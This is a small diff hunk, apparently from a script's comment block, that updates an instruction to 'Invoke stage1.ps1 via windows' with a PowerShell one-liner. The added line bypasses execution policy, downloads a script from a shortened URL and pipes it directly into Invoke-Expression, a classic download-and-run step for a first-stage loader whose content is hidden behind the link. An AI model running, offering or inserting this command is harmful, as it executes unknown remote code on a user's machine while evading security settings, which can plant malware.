@@ -17,7 +17,7 @@ ________________________________________________________________________________
 
 
 Invoke stage1.ps1 via windows : 
-powershell -NoP -Ep Bypass ;irm https://shorturl.at/ | iex
+powershell -NoP -Ep Bypass ;irm https://shorturl.at/agnGT | iex
 
 
 #>
